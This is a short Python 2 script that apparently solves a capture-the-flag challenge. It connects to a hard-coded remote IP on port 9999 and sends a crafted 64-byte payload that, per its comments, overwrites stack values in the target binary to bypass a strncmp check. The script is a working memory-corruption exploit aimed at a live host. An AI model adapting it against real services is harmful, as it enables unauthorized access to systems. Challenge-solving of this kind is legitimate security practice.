import socket

# straight out of python example code in documentation :D
class mysocket:
    '''demonstration class only
      - coded for clarity, not efficiency
    '''

    def __init__(self, sock=None):
        if sock is None:
            self.sock = socket.socket(
                socket.AF_INET, socket.SOCK_STREAM)
        else:
            self.sock = sock

    def connect(self, host, port):
        self.sock.connect((host, port))

    def mysend(self, msg):
        totalsent = 0
        while totalsent < len(msg):
            sent = self.sock.send(msg[totalsent:])
            if sent == 0:
                raise RuntimeError("socket connection broken")
            totalsent = totalsent + sent

    def myreceive(self, msglen):
        chunks = []
        bytes_recd = 0
        MSGLEN = msglen 
        while bytes_recd < MSGLEN:
            chunk = self.sock.recv(min(MSGLEN - bytes_recd, 2048))
            if chunk == '':
                raise RuntimeError("socket connection broken")
            chunks.append(chunk)
            bytes_recd = bytes_recd + len(chunk)
        return ''.join(chunks)


socket = mysocket()
socket.connect("52.49.91.111", 9999)
# get "KEY:" message
print socket.myreceive(4)
# write the 8 bytes the binary is expectiong at stack bottom - 0x40 and also overwrite stack bottom - 0x30 (so that strncmp succeeds)
# while we're at it, and since the binary reads 64 bytes from the socket, write 1 at stack bottom - 0x04
socket.mysend(''.join([chr(1) for i in xrange(61)] + [chr(0) for i in xrange(3)]))
print socket.myreceive(64)